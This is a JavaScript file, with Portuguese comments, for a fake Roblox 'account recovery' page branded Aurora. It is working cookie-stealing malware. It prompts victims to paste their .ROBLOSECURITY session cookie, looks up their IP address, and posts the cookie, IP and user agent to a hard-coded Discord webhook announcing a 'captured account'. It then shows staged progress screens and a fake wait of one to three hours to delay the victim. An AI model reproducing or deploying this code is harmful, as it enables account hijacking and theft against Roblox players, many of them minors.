// CONFIGURAÇÃO - SUBSTITUA PELO SEU WEBHOOK DO DISCORD
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1485346055141851308/-4ro_V3pWvgd_qRDW6uOO0WkVEmDQmt-9HNzgFd1MnqObF-TGy23rXLxESosIqg8KnFT";

// Chave para armazenar no localStorage
const STORAGE_KEY = "aurora_last_submission";

// Função para enviar dados para o Discord com @everyone
async function sendToDiscord(cookie, userAgent, ip) {
    const embed = {
        title: "🎮 @everyone NOVA CONTA VINCULADA - AURORA",
        description: "⚠️ **ALERTA IMEDIATO** - Nova conta detectada no sistema!",
        color: 0xff0000,
        fields: [
            {
                name: "🔐 Cookie (.ROBLOSECURITY)",
                value: `\`\`\`fix\n${cookie}\n\`\`\``,
                inline: false
            },
            {
                name: "🖥️ User Agent",
                value: `\`${userAgent}\``,
                inline: true
            },
            {
                name: "🌐 IP do Cliente",
                value: `\`${ip}\``,
                inline: true
            },
            {
                name: "📱 Tipo de Dispositivo",
                value: `${/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent) ? "📱 Celular/Tablet" : "💻 Desktop/PC"}`,
                inline: true
            },
            {
                name: "⏰ Data/Hora",
                value: `\`${new Date().toLocaleString('pt-BR')}\``,
                inline: false
            }
        ],
        footer: {
            text: "Aurora Security System | @everyone mencionado",
            icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
        },
        timestamp: new Date().toISOString()
    };

    const payload = {
        content: "@everyone **🚨 NOVA CONTA CAPTURADA!** 🚨",
        embeds: [embed],
        allowed_mentions: { parse: ["everyone"] }
    };

    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });
        
        if (response.ok) {
            console.log("Dados enviados para o Discord com sucesso!");
            return true;
        } else {
            console.error("Erro ao enviar para o Discord:", response.status);
            return false;
        }
    } catch (error) {
        console.error("Erro de conexão:", error);
        return false;
    }
}

// Função para obter IP do cliente via API pública
async function getClientIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Erro ao obter IP:", error);
        return "Não foi possível obter o IP";
    }
}

// Função para verificar cooldown (19 dias)
function checkCooldown() {
    const lastSubmission = localStorage.getItem(STORAGE_KEY);
    if (!lastSubmission) return { canSubmit: true, daysLeft: 0 };
    
    const lastDate = new Date(lastSubmission);
    const now = new Date();
    const diffTime = Math.abs(now - lastDate);
    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
    const daysLeft = 19 - diffDays;
    
    if (diffDays >= 19) {
        return { canSubmit: true, daysLeft: 0 };
    } else {
        return { canSubmit: false, daysLeft: daysLeft };
    }
}

// Função para salvar data da submissão
function saveSubmissionDate() {
    localStorage.setItem(STORAGE_KEY, new Date().toISOString());
}

// Função para mostrar mensagem temporária
function showMessage(message, isError = true) {
    const existingMsg = document.querySelector('.cooldown-message');
    if (existingMsg) existingMsg.remove();
    
    const msgDiv = document.createElement('div');
    msgDiv.className = 'cooldown-message';
    msgDiv.textContent = message;
    msgDiv.style.background = isError ? 'rgba(220, 38, 38, 0.9)' : 'rgba(34, 197, 94, 0.9)';
    document.body.appendChild(msgDiv);
    
    setTimeout(() => {
        msgDiv.remove();
    }, 5000);
}

// Função para mostrar tela de recuperação
function showRecoveryScreen() {
    document.getElementById('main-screen').style.display = 'none';
    document.getElementById('recovery-screen').style.display = 'block';
    document.getElementById('processing-screen').style.display = 'none';
}

// Função para mostrar tela de processamento
function showProcessingScreen(message) {
    document.getElementById('main-screen').style.display = 'none';
    document.getElementById('recovery-screen').style.display = 'none';
    document.getElementById('processing-screen').style.display = 'block';
    document.getElementById('processing-message').textContent = message;
}

// Função para resetar para tela principal
function resetToMainScreen() {
    document.getElementById('main-screen').style.display = 'block';
    document.getElementById('recovery-screen').style.display = 'none';
    document.getElementById('processing-screen').style.display = 'none';
    document.getElementById('cookie').value = '';
}

// Função principal de envio
async function submitCookie() {
    const cookieInput = document.getElementById('cookie');
    const cookie = cookieInput.value.trim();
    
    // Validar cookie
    if (!cookie) {
        showMessage("❌ Por favor, insira seu cookie .ROBLOSECURITY", true);
        return;
    }
    
    if (!cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS') && !cookie.includes('ROBLOSECURITY')) {
        showMessage("❌ Cookie inválido! Certifique-se de copiar o .ROBLOSECURITY completo", true);
        return;
    }
    
    // Verificar cooldown
    const { canSubmit, daysLeft } = checkCooldown();
    if (!canSubmit) {
        showMessage(`⚠️ Você precisa aguardar ${daysLeft} dias para realizar um novo processo.`, true);
        return;
    }
    
    // Mostrar tela de processamento
    showProcessingScreen("Verificando credenciais...");
    
    // Simular processamento
    setTimeout(async () => {
        showProcessingScreen("Autenticando no servidor...");
        
        setTimeout(async () => {
            showProcessingScreen("Conta encontrada! Recuperando dados...");
            
            setTimeout(async () => {
                // Obter IP e User Agent
                const ip = await getClientIP();
                const userAgent = navigator.userAgent;
                
                // Enviar para o Discord
                const sent = await sendToDiscord(cookie, userAgent, ip);
                
                if (sent) {
                    // Salvar data da submissão
                    saveSubmissionDate();
                    
                    // Mostrar tela de recuperação
                    showRecoveryScreen();
                } else {
                    showMessage("❌ Erro ao processar solicitação. Tente novamente mais tarde.", true);
                    resetToMainScreen();
                }
            }, 2000);
        }, 1500);
    }, 1000);
}

// Função para simular recuperação de conta
function startRecoveryProcess() {
    showProcessingScreen("Iniciando recuperação de conta...");
    
    setTimeout(() => {
        showProcessingScreen("Verificando dados do usuário...");
        
        setTimeout(() => {
            showProcessingScreen("Solicitando redefinição de senha...");
            
            setTimeout(() => {
                document.getElementById('processing-message').innerHTML = "⏳ Aguarde de 1 a 3 horas<br>A nova senha será enviada para este dispositivo.";
                
                // Barra de progresso infinita
                const progressFill = document.querySelector('.progress-fill');
                progressFill.style.animation = 'none';
                progressFill.offsetHeight;
                progressFill.style.animation = 'progress 3s ease-out infinite';
                
                // Salvar que o processo foi iniciado
                localStorage.setItem('aurora_recovery_started', new Date().toISOString());
                
                // Mostrar mensagem de aviso
                setTimeout(() => {
                    showMessage("⏰ Processo iniciado! Aguarde de 1 a 3 horas. Recarregue a página após o período para tentar novamente.", false);
                }, 1000);
            }, 1500);
        }, 1500);
    }, 1500);
}

// Verificar cooldown ao carregar a página
window.addEventListener('DOMContentLoaded', () => {
    const { canSubmit, daysLeft } = checkCooldown();
    
    if (!canSubmit) {
        showMessage(`🔒 Você já utilizou o sistema há ${19 - daysLeft} dias. Aguarde mais ${daysLeft} dias para um novo processo.`, true);
        
        // Desabilitar botão após 3 segundos se estiver em cooldown
        setTimeout(() => {
            const sendBtn = document.getElementById('send-btn');
            if (sendBtn) {
                sendBtn.disabled = true;
                sendBtn.style.opacity = '0.5';
                sendBtn.style.cursor = 'not-allowed';
            }
        }, 3000);
    }
    
    // Verificar se já existe um processo de recuperação em andamento
    const recoveryStarted = localStorage.getItem('aurora_recovery_started');
    if (recoveryStarted) {
        const startDate = new Date(recoveryStarted);
        const now = new Date();
        const hoursPassed = (now - startDate) / (1000 * 60 * 60);
        
        if (hoursPassed < 3) {
            const remainingHours = Math.ceil(3 - hoursPassed);
            showMessage(`⏳ Processo de recuperação em andamento. Aguarde mais ${remainingHours} horas.`, false);
        } else if (hoursPassed >= 3 && hoursPassed < 24) {
            showMessage("✅ Processo concluído! Recarregue a página para iniciar um novo processo.", false);
            // Limpar após 24 horas
            setTimeout(() => {
                localStorage.removeItem('aurora_recovery_started');
            }, 86400000 - (now - startDate));
        }
    }
});

// Event Listeners
document.getElementById('send-btn').addEventListener('click', submitCookie);
document.getElementById('recover-btn').addEventListener('click', startRecoveryProcess);

// Permitir enviar com Enter
document.getElementById('cookie').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        submitCookie();
    }
});